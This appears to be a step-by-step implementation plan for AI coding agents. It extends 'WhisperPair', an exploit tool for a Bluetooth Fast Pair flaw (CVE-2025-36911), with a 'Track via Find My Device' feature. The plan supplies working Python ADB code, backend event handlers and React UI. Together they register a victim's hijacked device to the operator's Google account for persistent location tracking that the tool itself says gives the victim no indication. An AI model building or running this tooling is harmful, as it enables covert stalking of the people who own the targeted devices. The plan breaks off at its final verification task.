# Find My Device Tracking Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add ADB-based Android phone handoff to WhisperPair so exploited devices get registered with Google Find My Device for persistent location tracking.

**Architecture:** New `adb_manager.py` backend module wraps ADB shell commands (same pattern as existing `bluetoothctl` usage). New Socket.IO events stream ADB status to the React frontend. The ResultCard gains a tracking section with a "Track via Find My Device" button, confirmation display, and educational modal.

**Tech Stack:** Python (subprocess for ADB), Flask-SocketIO (existing), React 19, Lucide icons, Socket.IO Client

---

## File Structure

| File | Action | Responsibility |
|------|--------|---------------|
| `adb_manager.py` | Create | ADB device detection, Bluetooth enable, pairing, verification |
| `test_adb_manager.py` | Create | Unit tests for ADB manager |
| `app.py` | Modify | Add ADB Socket.IO events (`adb:scan`, `adb:select`, `adb:pair`, `adb:status`) |
| `frontend/src/App.jsx` | Modify | ADB state + event listeners + handler functions |
| `frontend/src/components/TopBar.jsx` | Modify | ADB phone indicator with dropdown |
| `frontend/src/components/ResultCard.jsx` | Modify | Track button, confirmation section, educational modal |
| `frontend/src/App.css` | Modify | Styles for ADB indicator, track section, educational modal |

---

### Task 1: ADB Manager — Device Detection

**Files:**
- Create: `adb_manager.py`
- Create: `test_adb_manager.py`

- [ ] **Step 1: Write failing test for list_devices**

Create `test_adb_manager.py`:

```python
import unittest
from unittest.mock import patch, MagicMock

from adb_manager import ADBManager


class TestADBManagerListDevices(unittest.TestCase):

    @patch("adb_manager.subprocess.run")
    def test_list_devices_returns_connected_phones(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="List of devices attached\nR5CT720B9HF device usb:1-2 product:starqltesq model:SM_G965U device:starqltesq transport_id:3\n\n",
        )
        mgr = ADBManager()
        devices = mgr.list_devices()
        self.assertEqual(len(devices), 1)
        self.assertEqual(devices[0]["id"], "R5CT720B9HF")
        self.assertEqual(devices[0]["model"], "SM_G965U")
        self.assertEqual(devices[0]["status"], "device")

    @patch("adb_manager.subprocess.run")
    def test_list_devices_empty_when_none_connected(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="List of devices attached\n\n",
        )
        mgr = ADBManager()
        devices = mgr.list_devices()
        self.assertEqual(devices, [])

    @patch("adb_manager.subprocess.run")
    def test_list_devices_handles_adb_not_found(self, mock_run):
        mock_run.side_effect = FileNotFoundError("adb not found")
        mgr = ADBManager()
        devices = mgr.list_devices()
        self.assertEqual(devices, [])


if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd "<repo-root>" && python -m pytest test_adb_manager.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'adb_manager'`

- [ ] **Step 3: Implement ADBManager with list_devices**

Create `adb_manager.py`:

```python
"""
ADB Manager - Android Debug Bridge wrapper for WhisperPair
Detects connected Android phones and triggers Bluetooth pairing via ADB.
"""

import subprocess
import re


class ADBManager:
    """Wraps ADB shell commands for Android phone interaction."""

    def list_devices(self):
        """List connected ADB devices with model info."""
        try:
            result = subprocess.run(
                ["adb", "devices", "-l"],
                capture_output=True,
                text=True,
                timeout=5,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return []

        if result.returncode != 0:
            return []

        devices = []
        for line in result.stdout.strip().splitlines()[1:]:
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) < 2:
                continue
            device_id = parts[0]
            status = parts[1]
            model = ""
            for part in parts[2:]:
                if part.startswith("model:"):
                    model = part.split(":", 1)[1]
                    break
            devices.append({
                "id": device_id,
                "status": status,
                "model": model,
            })
        return devices
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd "<repo-root>" && python -m pytest test_adb_manager.py::TestADBManagerListDevices -v`
Expected: 3 tests PASS

- [ ] **Step 5: Commit**

```bash
git add adb_manager.py test_adb_manager.py
git commit -m "feat: add ADB manager with device detection"
```

---

### Task 2: ADB Manager — Bluetooth Enable & Pairing

**Files:**
- Modify: `adb_manager.py`
- Modify: `test_adb_manager.py`

- [ ] **Step 1: Write failing tests for enable_bluetooth, pair_device, and verify_paired**

Append to `test_adb_manager.py`:

```python
class TestADBManagerBluetooth(unittest.TestCase):

    @patch("adb_manager.subprocess.run")
    def test_enable_bluetooth_success(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="")
        mgr = ADBManager()
        result = mgr.enable_bluetooth("R5CT720B9HF")
        self.assertTrue(result)
        mock_run.assert_called_once_with(
            ["adb", "-s", "R5CT720B9HF", "shell", "cmd", "bluetooth_manager", "enable"],
            capture_output=True,
            text=True,
            timeout=10,
        )

    @patch("adb_manager.subprocess.run")
    def test_pair_device_tries_bluetooth_manager_first(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0, stdout="")
        mgr = ADBManager()
        result = mgr.pair_device("R5CT720B9HF", "AA:BB:CC:DD:EE:FF")
        self.assertTrue(result)

    @patch("adb_manager.subprocess.run")
    def test_pair_device_falls_back_to_intent(self, mock_run):
        # First call (bluetooth_manager pair) fails, second call (am start intent) succeeds
        mock_run.side_effect = [
            MagicMock(returncode=1, stdout="Error"),
            MagicMock(returncode=0, stdout="Starting: Intent"),
        ]
        mgr = ADBManager()
        result = mgr.pair_device("R5CT720B9HF", "AA:BB:CC:DD:EE:FF")
        self.assertTrue(result)
        self.assertEqual(mock_run.call_count, 2)

    @patch("adb_manager.subprocess.run")
    def test_verify_paired_finds_device(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Bonded devices:\nAA:BB:CC:DD:EE:FF\n01:02:03:04:05:06\n",
        )
        mgr = ADBManager()
        result = mgr.verify_paired("R5CT720B9HF", "AA:BB:CC:DD:EE:FF")
        self.assertTrue(result)

    @patch("adb_manager.subprocess.run")
    def test_verify_paired_device_not_found(self, mock_run):
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Bonded devices:\n01:02:03:04:05:06\n",
        )
        mgr = ADBManager()
        result = mgr.verify_paired("R5CT720B9HF", "AA:BB:CC:DD:EE:FF")
        self.assertFalse(result)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd "<repo-root>" && python -m pytest test_adb_manager.py::TestADBManagerBluetooth -v`
Expected: FAIL with `AttributeError: 'ADBManager' object has no attribute 'enable_bluetooth'`

- [ ] **Step 3: Implement enable_bluetooth, pair_device, verify_paired, and get_device_info**

Add to `adb_manager.py` inside the `ADBManager` class, after `list_devices`:

```python
    def get_device_info(self, device_id):
        """Get detailed info about a connected Android device."""
        info = {"id": device_id, "model": "", "android_version": "", "bt_enabled": False}
        try:
            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "getprop", "ro.product.model"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                info["model"] = result.stdout.strip()

            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "getprop", "ro.build.version.release"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                info["android_version"] = result.stdout.strip()

            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "settings", "get", "global", "bluetooth_on"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                info["bt_enabled"] = result.stdout.strip() == "1"
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return info

    def enable_bluetooth(self, device_id):
        """Enable Bluetooth on the Android device."""
        try:
            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "cmd", "bluetooth_manager", "enable"],
                capture_output=True, text=True, timeout=10,
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def pair_device(self, device_id, br_edr_address):
        """Pair Android phone with target device. Tries multiple approaches for Android 14."""
        # Approach 1: bluetooth_manager pair command
        try:
            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "cmd", "bluetooth_manager", "pair", br_edr_address],
                capture_output=True, text=True, timeout=15,
            )
            if result.returncode == 0 and "error" not in result.stdout.lower():
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Approach 2: Bluetooth pairing intent
        try:
            result = subprocess.run(
                [
                    "adb", "-s", device_id, "shell", "am", "start",
                    "-a", "android.bluetooth.device.action.PAIRING_REQUEST",
                    "-e", "android.bluetooth.device.extra.DEVICE", br_edr_address,
                ],
                capture_output=True, text=True, timeout=15,
            )
            if result.returncode == 0:
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return False

    def verify_paired(self, device_id, br_edr_address):
        """Check if the target device appears in the phone's bonded devices."""
        try:
            result = subprocess.run(
                ["adb", "-s", device_id, "shell", "cmd", "bluetooth_manager", "list-bonded-devices"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                return br_edr_address.upper() in result.stdout.upper()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return False
```

- [ ] **Step 4: Run all ADB manager tests**

Run: `cd "<repo-root>" && python -m pytest test_adb_manager.py -v`
Expected: All 8 tests PASS

- [ ] **Step 5: Commit**

```bash
git add adb_manager.py test_adb_manager.py
git commit -m "feat: add ADB bluetooth enable, pairing, and verification"
```

---

### Task 3: Backend Socket.IO Events for ADB

**Files:**
- Modify: `app.py`

- [ ] **Step 1: Add ADB imports and state to app.py**

At the top of `app.py`, after the existing imports (line 36, after `import secrets`), add:

```python
from adb_manager import ADBManager

adb = ADBManager()
selected_adb_device = None
```

- [ ] **Step 2: Add adb:scan Socket.IO handler**

After the `handle_connect` function (after line 111), add:

```python
@socketio.on("adb:scan")
def handle_adb_scan():
    devices = adb.list_devices()
    for dev in devices:
        info = adb.get_device_info(dev["id"])
        dev.update(info)
    emit("adb:devices", {"devices": devices})


@socketio.on("adb:select")
def handle_adb_select(data):
    global selected_adb_device
    selected_adb_device = data.get("device_id")
    emit("adb:status", {
        "stage": "selected",
        "message": f"Selected device: {selected_adb_device}",
        "status": "success",
    })
```

- [ ] **Step 3: Add adb:pair Socket.IO handler**

After the `handle_adb_select` function, add:

```python
@socketio.on("adb:pair")
def handle_adb_pair(data):
    device_id = data.get("device_id") or selected_adb_device
    br_edr_address = data.get("br_edr_address")

    if not device_id:
        emit("adb:status", {
            "stage": "error",
            "message": "No Android phone selected",
            "status": "error",
        })
        return

    if not br_edr_address:
        emit("adb:status", {
            "stage": "error",
            "message": "No BR/EDR address provided",
            "status": "error",
        })
        return

    def run_adb_pair():
        socketio.emit("adb:status", {
            "stage": "enabling_bt",
            "message": f"Enabling Bluetooth on {device_id}...",
            "status": "running",
        })
        adb.enable_bluetooth(device_id)

        socketio.emit("adb:status", {
            "stage": "pairing",
            "message": f"Pairing {device_id} with {br_edr_address}...",
            "status": "running",
        })
        paired = adb.pair_device(device_id, br_edr_address)

        if not paired:
            socketio.emit("adb:status", {
                "stage": "pairing",
                "message": "ADB pairing command failed",
                "status": "error",
            })
            return

        socketio.emit("adb:status", {
            "stage": "verifying",
            "message": "Verifying device registration...",
            "status": "running",
        })

        import time
        time.sleep(3)
        verified = adb.verify_paired(device_id, br_edr_address)

        if verified:
            socketio.emit("adb:status", {
                "stage": "complete",
                "message": "Device paired and registered with Find My Device",
                "status": "success",
                "br_edr_address": br_edr_address,
            })
        else:
            socketio.emit("adb:status", {
                "stage": "complete",
                "message": "Pairing sent but could not verify registration. Check your phone manually.",
                "status": "warning",
                "br_edr_address": br_edr_address,
            })

    thread = threading.Thread(target=run_adb_pair, daemon=True)
    thread.start()
```

- [ ] **Step 4: Verify backend starts without errors**

Run: `cd "<repo-root>" && python -c "from app import app, socketio; print('Backend imports OK')"`
Expected: `Backend imports OK`

- [ ] **Step 5: Commit**

```bash
git add app.py
git commit -m "feat: add ADB Socket.IO events for phone detection and pairing"
```

---

### Task 4: Frontend — ADB State & Event Listeners in App.jsx

**Files:**
- Modify: `frontend/src/App.jsx`

- [ ] **Step 1: Add ADB state variables**

In `App.jsx`, after the existing state declarations (after line 15 `const [result, setResult] = useState(null);`), add:

```jsx
const [adbDevices, setAdbDevices] = useState([]);
const [selectedAdbDevice, setSelectedAdbDevice] = useState(null);
const [trackingStatus, setTrackingStatus] = useState(null); // null | 'pairing' | 'success' | 'warning' | 'error'
const [trackingMessage, setTrackingMessage] = useState('');
```

- [ ] **Step 2: Add ADB event listeners inside the useEffect**

In the `useEffect` block, before the `return () => {` cleanup (before line 77), add these listeners:

```jsx
    socket.on('adb:devices', (data) => {
      setAdbDevices(data.devices || []);
      if (data.devices.length === 1 && !selectedAdbDevice) {
        setSelectedAdbDevice(data.devices[0].id);
      }
    });

    socket.on('adb:status', (entry) => {
      if (entry.stage === 'complete') {
        setTrackingStatus(entry.status === 'success' ? 'success' : 'warning');
        setTrackingMessage(entry.message);
      } else if (entry.status === 'error') {
        setTrackingStatus('error');
        setTrackingMessage(entry.message);
      }
      setLogEntries((prev) => [...prev, {
        stage: `adb:${entry.stage}`,
        message: entry.message,
        status: entry.status,
        timestamp: new Date().toISOString(),
      }]);
    });
```

Add cleanup for these in the return block (alongside the other `socket.off` calls):

```jsx
      socket.off('adb:devices');
      socket.off('adb:status');
```

- [ ] **Step 3: Add ADB scan on connect and polling**

After the existing `useEffect` (after line 89), add:

```jsx
  useEffect(() => {
    if (!connected) return;
    socket.emit('adb:scan');
    const interval = setInterval(() => socket.emit('adb:scan'), 10000);
    return () => clearInterval(interval);
  }, [connected]);
```

- [ ] **Step 4: Add handler functions for ADB**

After `handleStop` (after line 113), add:

```jsx
  const handleSelectAdbDevice = useCallback((deviceId) => {
    setSelectedAdbDevice(deviceId);
    socket.emit('adb:select', { device_id: deviceId });
  }, []);

  const handleTrack = useCallback(() => {
    if (!result?.br_edr_address) return;
    setTrackingStatus('pairing');
    setTrackingMessage('');
    socket.emit('adb:pair', {
      device_id: selectedAdbDevice,
      br_edr_address: result.br_edr_address,
    });
  }, [selectedAdbDevice, result]);
```

- [ ] **Step 5: Pass new props to TopBar and ResultCard**

Update the JSX return. Change the `<TopBar>` to:

```jsx
      <TopBar
        connected={connected}
        scanning={scanning}
        onScan={handleScan}
        adbDevices={adbDevices}
        selectedAdbDevice={selectedAdbDevice}
        onSelectAdbDevice={handleSelectAdbDevice}
      />
```

Change the `<ExploitPanel>` to:

```jsx
        <ExploitPanel
          device={selectedDevice}
          exploitRunning={exploitRunning}
          logEntries={logEntries}
          result={result}
          onExecute={handleExecute}
          onStop={handleStop}
          trackingStatus={trackingStatus}
          trackingMessage={trackingMessage}
          onTrack={handleTrack}
          adbConnected={adbDevices.some((d) => d.status === 'device')}
        />
```

- [ ] **Step 6: Commit**

```bash
cd frontend && git add src/App.jsx && cd ..
git commit -m "feat: add ADB state management and event listeners to App"
```

---

### Task 5: Frontend — ADB Phone Indicator in TopBar

**Files:**
- Modify: `frontend/src/components/TopBar.jsx`
- Modify: `frontend/src/App.css`

- [ ] **Step 1: Update TopBar component**

Replace the entire contents of `TopBar.jsx` with:

```jsx
import { useState } from 'react';
import { Bluetooth, Radar, Wifi, WifiOff, Smartphone, ChevronDown } from 'lucide-react';

export default function TopBar({
  connected,
  scanning,
  onScan,
  adbDevices,
  selectedAdbDevice,
  onSelectAdbDevice,
}) {
  const [dropdownOpen, setDropdownOpen] = useState(false);

  const connectedPhones = (adbDevices || []).filter((d) => d.status === 'device');
  const selectedPhone = connectedPhones.find((d) => d.id === selectedAdbDevice);
  const hasPhone = connectedPhones.length > 0;

  return (
    <header className="topbar">
      <div className="topbar-left">
        <Bluetooth size={22} className="topbar-icon" />
        <h1 className="topbar-title">WhisperPair</h1>
        <span className="topbar-cve">CVE-2025-36911</span>
      </div>
      <div className="topbar-right">
        <div className="adb-indicator-wrapper">
          <div
            className={`adb-indicator ${hasPhone ? 'adb-connected' : 'adb-disconnected'}`}
            onClick={() => connectedPhones.length > 1 && setDropdownOpen(!dropdownOpen)}
            role={connectedPhones.length > 1 ? 'button' : undefined}
          >
            <Smartphone size={14} />
            <span>
              {hasPhone
                ? selectedPhone?.model || selectedPhone?.id || 'Phone connected'
                : 'No phone'}
            </span>
            {connectedPhones.length > 1 && <ChevronDown size={12} />}
          </div>
          {dropdownOpen && connectedPhones.length > 1 && (
            <div className="adb-dropdown">
              {connectedPhones.map((phone) => (
                <button
                  key={phone.id}
                  className={`adb-dropdown-item ${phone.id === selectedAdbDevice ? 'active' : ''}`}
                  onClick={() => {
                    onSelectAdbDevice(phone.id);
                    setDropdownOpen(false);
                  }}
                >
                  <Smartphone size={12} />
                  <span>{phone.model || phone.id}</span>
                  {phone.android_version && (
                    <span className="adb-android-ver">Android {phone.android_version}</span>
                  )}
                </button>
              ))}
            </div>
          )}
        </div>
        <div className={`connection-status ${connected ? 'online' : 'offline'}`}>
          {connected ? <Wifi size={14} /> : <WifiOff size={14} />}
          <span>{connected ? 'Connected' : 'Disconnected'}</span>
        </div>
        <button
          className="btn btn-scan"
          onClick={onScan}
          disabled={scanning || !connected}
        >
          <Radar size={16} className={scanning ? 'spin' : ''} />
          {scanning ? 'Scanning...' : 'Scan Devices'}
        </button>
      </div>
    </header>
  );
}
```

- [ ] **Step 2: Add ADB indicator styles to App.css**

Append to the end of `App.css`:

```css
/* ==============================================================================
   ADB Phone Indicator
   ============================================================================== */

.adb-indicator-wrapper {
  position: relative;
}

.adb-indicator {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  font-weight: 500;
  padding: 4px 10px;
  border-radius: var(--radius);
  border: 1px solid var(--border);
  background: var(--bg-card);
  transition: all 0.15s ease;
}

.adb-indicator[role='button'] {
  cursor: pointer;
}

.adb-indicator[role='button']:hover {
  border-color: var(--border-light);
  background: var(--bg-card-hover);
}

.adb-connected {
  color: var(--success);
  border-color: rgba(34, 197, 94, 0.3);
}

.adb-disconnected {
  color: var(--text-muted);
}

.adb-dropdown {
  position: absolute;
  top: calc(100% + 4px);
  right: 0;
  background: var(--bg-secondary);
  border: 1px solid var(--border-light);
  border-radius: var(--radius);
  min-width: 220px;
  z-index: 100;
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
  overflow: hidden;
}

.adb-dropdown-item {
  display: flex;
  align-items: center;
  gap: 8px;
  width: 100%;
  padding: 8px 12px;
  background: none;
  border: none;
  color: var(--text-primary);
  font-size: 12px;
  font-family: var(--font-sans);
  cursor: pointer;
  transition: background 0.1s ease;
}

.adb-dropdown-item:hover {
  background: var(--bg-card-hover);
}

.adb-dropdown-item.active {
  color: var(--accent);
}

.adb-android-ver {
  margin-left: auto;
  color: var(--text-muted);
  font-size: 11px;
}
```

- [ ] **Step 3: Verify frontend builds without errors**

Run: `cd "<repo-root>/frontend" && npx vite build 2>&1 | tail -5`
Expected: Build succeeds with no errors

- [ ] **Step 4: Commit**

```bash
git add frontend/src/components/TopBar.jsx frontend/src/App.css
git commit -m "feat: add ADB phone indicator to TopBar with dropdown"
```

---

### Task 6: Frontend — Track Button & Confirmation in ResultCard

**Files:**
- Modify: `frontend/src/components/ResultCard.jsx`
- Modify: `frontend/src/App.css`

- [ ] **Step 1: Update ExploitPanel to pass tracking props to ResultCard**

In `ExploitPanel.jsx`, update the props destructuring (line 7) to include the new props:

```jsx
export default function ExploitPanel({
  device,
  exploitRunning,
  logEntries,
  result,
  onExecute,
  onStop,
  trackingStatus,
  trackingMessage,
  onTrack,
  adbConnected,
}) {
```

Update the `<ResultCard>` usage (line 78) to:

```jsx
        <ResultCard
          result={result}
          trackingStatus={trackingStatus}
          trackingMessage={trackingMessage}
          onTrack={onTrack}
          adbConnected={adbConnected}
        />
```

- [ ] **Step 2: Update ResultCard with tracking section**

Replace the entire contents of `ResultCard.jsx` with:

```jsx
import { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Key,
  Link,
  Fingerprint,
  MapPin,
  ExternalLink,
  Smartphone,
  CheckCircle,
  AlertTriangle,
  Loader,
  Info,
  X,
  ChevronDown,
  ChevronUp,
} from 'lucide-react';

function TrackingInfoModal({ onClose }) {
  return (
    <div className="info-overlay" onClick={onClose}>
      <div className="info-modal" onClick={(e) => e.stopPropagation()}>
        <div className="info-modal-header">
          <div className="info-modal-title">
            <MapPin size={16} />
            <h3>How Find My Device Tracking Works</h3>
          </div>
          <button className="info-close" onClick={onClose}>
            <X size={16} />
          </button>
        </div>
        <div className="info-modal-body">
          <div className="info-section">
            <h4>1. Account Key Injection</h4>
            <p>
              WhisperPair wrote a random Account Key to the target device. When your Android phone
              pairs with the device, it registers its own Account Key with your Google Account,
              linking the device to you.
            </p>
          </div>
          <div className="info-section">
            <h4>2. FMDN Beacons</h4>
            <p>
              The hijacked device now periodically broadcasts Find My Device Network (FMDN)
              advertisement frames over BLE, derived from the registered Account Key.
            </p>
          </div>
          <div className="info-section">
            <h4>3. Crowd-Sourced Location</h4>
            <p>
              Any nearby Android device participating in the Find Hub network detects these beacons
              and reports them to Google's servers along with its own GPS coordinates.
            </p>
          </div>
          <div className="info-section">
            <h4>4. Location Query</h4>
            <p>
              As the Account Key owner, you can query Google's Find My Device to see the last
              reported location of the hijacked device.
            </p>
          </div>
          <div className="info-section">
            <h4>5. Security Implications</h4>
            <p>
              This demonstrates that CVE-2025-36911 escalates from a one-time pairing bypass to
              persistent location surveillance. The victim's device is trackable anywhere there
              are nearby Android phones, with no indication to the victim.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function ResultCard({
  result,
  trackingStatus,
  trackingMessage,
  onTrack,
  adbConnected,
}) {
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [learnMoreOpen, setLearnMoreOpen] = useState(false);

  if (!result) return null;

  const isVulnerable = result.vulnerable;
  const canTrack = isVulnerable && result.br_edr_address && result.success;

  return (
    <div className={`result-card ${isVulnerable ? 'result-vulnerable' : 'result-safe'}`}>
      <div className="result-header">
        {isVulnerable ? (
          <>
            <ShieldAlert size={22} className="result-icon-vuln" />
            <h3>VULNERABLE - CVE-2025-36911</h3>
          </>
        ) : (
          <>
            <ShieldCheck size={22} className="result-icon-safe" />
            <h3>Device Appears Patched</h3>
          </>
        )}
      </div>

      {isVulnerable && (
        <div className="result-details">
          <div className="result-row">
            <Fingerprint size={14} />
            <span className="result-label">Model ID</span>
            <span className="result-value">{result.model_id || 'Unknown'}</span>
          </div>
          <div className="result-row">
            <Link size={14} />
            <span className="result-label">BR/EDR Address</span>
            <span className="result-value mono">{result.br_edr_address || 'N/A'}</span>
          </div>
          <div className="result-row">
            <Key size={14} />
            <span className="result-label">Account Key Written</span>
            <span className={`result-value ${result.account_key_written ? 'text-success' : 'text-muted'}`}>
              {result.account_key_written ? 'YES' : 'NO'}
            </span>
          </div>
          <div className="result-row">
            <Link size={14} />
            <span className="result-label">Classic BT Paired</span>
            <span className={`result-value ${result.paired ? 'text-success' : 'text-muted'}`}>
              {result.paired ? 'YES' : 'NO'}
            </span>
          </div>
          {result.strategies_tried && (
            <div className="result-row">
              <ShieldAlert size={14} />
              <span className="result-label">Strategies Tried</span>
              <span className="result-value">{result.strategies_tried.join(', ')}</span>
            </div>
          )}
          {result.notifications && result.notifications.length > 0 && (
            <div className="result-notifications">
              <h4>Notifications ({result.notifications.length})</h4>
              {result.notifications.map((n, i) => (
                <div key={i} className="notification-entry">
                  <code>{n.hex}</code>
                  <span className="notif-entropy">entropy: {n.entropy}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      <div className="result-message">{result.message}</div>

      {canTrack && (
        <div className="tracking-section">
          <div className="tracking-header">
            <MapPin size={16} />
            <h4>Find My Device Tracking</h4>
            <button
              className="info-btn"
              onClick={() => setShowInfoModal(true)}
              title="How tracking works"
            >
              <Info size={15} />
            </button>
          </div>

          {!trackingStatus && (
            <div className="tracking-actions">
              <button
                className="btn btn-track"
                onClick={onTrack}
                disabled={!adbConnected}
              >
                <Smartphone size={16} />
                Track via Find My Device
              </button>
              {!adbConnected && (
                <p className="tracking-hint">Connect an Android phone via USB with ADB debugging enabled</p>
              )}
            </div>
          )}

          {trackingStatus === 'pairing' && (
            <div className="tracking-progress">
              <Loader size={16} className="spin" />
              <span>Pairing with Android phone...</span>
            </div>
          )}

          {trackingStatus === 'success' && (
            <div className="tracking-confirmed">
              <div className="tracking-confirmed-header">
                <CheckCircle size={16} />
                <span>Device registered to Find My Device</span>
              </div>
              <p className="tracking-confirmed-detail">
                Your Android phone has paired with the target device and registered it with your
                Google Account. The device will now broadcast FMDN beacons that the Find My Device
                network can locate.
              </p>
              <a
                href="https://www.google.com/android/find"
                target="_blank"
                rel="noopener noreferrer"
                className="btn btn-findmy"
              >
                <ExternalLink size={14} />
                Open Find My Device
              </a>
              <button
                className="tracking-learn-more"
                onClick={() => setLearnMoreOpen(!learnMoreOpen)}
              >
                {learnMoreOpen ? <ChevronUp size={14} /> : <ChevronDown size={14} />}
                {learnMoreOpen ? 'Hide details' : 'Learn more about how this works'}
              </button>
              {learnMoreOpen && (
                <div className="tracking-learn-content">
                  <p>
                    <strong>What happened:</strong> WhisperPair exploited CVE-2025-36911 to force-pair
                    with the target device. Your Android phone then paired via ADB, causing Google's
                    Fast Pair service to register the device with your Google Account.
                  </p>
                  <p>
                    <strong>What happens next:</strong> The target device broadcasts FMDN beacons.
                    Any nearby Android device in the Find Hub network reports these beacons to Google
                    with GPS coordinates. You can view the location on Find My Device.
                  </p>
                  <p>
                    <strong>Security impact:</strong> This turns a BLE pairing vulnerability into
                    persistent, crowd-sourced location surveillance with no indication to the victim.
                  </p>
                </div>
              )}
            </div>
          )}

          {trackingStatus === 'warning' && (
            <div className="tracking-warning">
              <AlertTriangle size={16} />
              <span>{trackingMessage}</span>
              <a
                href="https://www.google.com/android/find"
                target="_blank"
                rel="noopener noreferrer"
                className="btn btn-findmy"
              >
                <ExternalLink size={14} />
                Check Find My Device
              </a>
            </div>
          )}

          {trackingStatus === 'error' && (
            <div className="tracking-error">
              <AlertTriangle size={16} />
              <span>{trackingMessage}</span>
              <button className="btn btn-track-retry" onClick={onTrack}>
                Retry
              </button>
            </div>
          )}
        </div>
      )}

      {showInfoModal && <TrackingInfoModal onClose={() => setShowInfoModal(false)} />}
    </div>
  );
}
```

- [ ] **Step 3: Add tracking styles to App.css**

Append to the end of `App.css`:

```css
/* ==============================================================================
   Tracking Section
   ============================================================================== */

.tracking-section {
  margin-top: 14px;
  padding-top: 14px;
  border-top: 1px solid var(--border);
}

.tracking-header {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 12px;
}

.tracking-header h4 {
  font-size: 13px;
  font-weight: 600;
  flex: 1;
}

.tracking-header .info-btn {
  margin-left: 0;
}

.tracking-actions {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.btn-track {
  width: 100%;
  justify-content: center;
  background: var(--accent);
  border-color: var(--accent);
  color: #fff;
  padding: 10px 20px;
  font-size: 14px;
  font-weight: 600;
}

.btn-track:hover:not(:disabled) {
  background: var(--accent-hover);
  border-color: var(--accent-hover);
}

.tracking-hint {
  font-size: 12px;
  color: var(--text-muted);
  text-align: center;
}

.tracking-progress {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px;
  font-size: 13px;
  color: var(--accent);
  background: rgba(99, 102, 241, 0.08);
  border-radius: var(--radius);
}

.tracking-confirmed {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.tracking-confirmed-header {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  font-weight: 600;
  color: var(--success);
}

.tracking-confirmed-detail {
  font-size: 12px;
  color: var(--text-secondary);
  line-height: 1.6;
}

.btn-findmy {
  width: 100%;
  justify-content: center;
  background: #4285f4;
  border-color: #4285f4;
  color: #fff;
  padding: 10px 20px;
  font-size: 13px;
  font-weight: 600;
  text-decoration: none;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  border-radius: var(--radius);
  transition: all 0.15s ease;
}

.btn-findmy:hover {
  background: #3367d6;
  border-color: #3367d6;
}

.tracking-learn-more {
  display: flex;
  align-items: center;
  gap: 6px;
  background: none;
  border: none;
  color: var(--text-secondary);
  font-size: 12px;
  font-family: var(--font-sans);
  cursor: pointer;
  padding: 4px 0;
  transition: color 0.15s ease;
}

.tracking-learn-more:hover {
  color: var(--text-primary);
}

.tracking-learn-content {
  display: flex;
  flex-direction: column;
  gap: 8px;
  padding: 12px;
  background: var(--bg-input);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  font-size: 12px;
  line-height: 1.6;
  color: var(--text-secondary);
}

.tracking-learn-content strong {
  color: var(--text-primary);
}

.tracking-warning {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 8px;
  padding: 10px;
  font-size: 13px;
  color: var(--warning);
  background: var(--warning-bg);
  border-radius: var(--radius);
}

.tracking-warning .btn-findmy {
  width: auto;
  margin-top: 4px;
  padding: 6px 14px;
  font-size: 12px;
}

.tracking-error {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 8px;
  padding: 10px;
  font-size: 13px;
  color: var(--error);
  background: var(--error-bg);
  border-radius: var(--radius);
}

.btn-track-retry {
  margin-left: auto;
  padding: 4px 12px;
  font-size: 12px;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  color: var(--text-primary);
  cursor: pointer;
  font-family: var(--font-sans);
  transition: all 0.15s ease;
}

.btn-track-retry:hover {
  background: var(--bg-card-hover);
  border-color: var(--border-light);
}
```

- [ ] **Step 4: Verify frontend builds**

Run: `cd "<repo-root>/frontend" && npx vite build 2>&1 | tail -5`
Expected: Build succeeds with no errors

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/ExploitPanel.jsx frontend/src/components/ResultCard.jsx frontend/src/App.css
git commit -m "feat: add Find My Device tracking UI with educational modal"
```

---

### Task 7: Integration Verification

**Files:** None (verification only)

- [ ] **Step 1: Run all Python tests**

